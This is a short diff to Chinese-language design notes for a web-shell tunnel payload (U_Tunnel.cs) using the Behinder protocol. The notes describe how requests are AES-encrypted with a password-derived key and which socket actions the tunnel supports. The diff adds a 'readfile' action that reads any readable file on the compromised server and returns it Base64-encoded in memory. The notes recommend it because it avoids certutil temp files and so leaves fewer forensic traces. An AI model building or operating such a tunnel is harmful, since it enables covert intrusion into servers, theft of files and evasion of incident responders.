@@ -22,8 +22,10 @@ metadata:
 
 ## 载荷设计 (U_Tunnel.cs 式, 冰蝎协议)
 - 请求体 = [载荷DLL] + "~~~~~~"(0x7E×6) + "a:base64(action),t:...,p:...,id:...,d:base64(数据)" 整体 AES 加密(密钥=MD5(密码)hex前16位, CBC IV=key)
-- 动作: connect(建Socket存状态) / send(写数据+阻塞读响应) / read(非阻塞读) / close
+- 动作: connect(建Socket存状态) / send(写数据+阻塞读响应) / read(非阻塞读) / close / **readfile(零写入文件外带)**
 - 响应: `BinaryWrite("TUN:" + 数据)` 明文, 客户端剥壳前缀("Welcome You!...")后按字节取
+- **readfile 动作**: `File.ReadAllBytes(f)` → `Convert.ToBase64String` 内存内输出 — 拉取任意可读文件
+  无需 certutil 临时文件(用户对留痕敏感时的首选; 配 Application 状态跨请求可用)
 
 ### ★ 三个必踩的坑
 1. **请求体是密文**: 解析尾部参数前必须 `Decrypt(BinaryRead(ContentLength))` 解密(Session[0] 密钥),
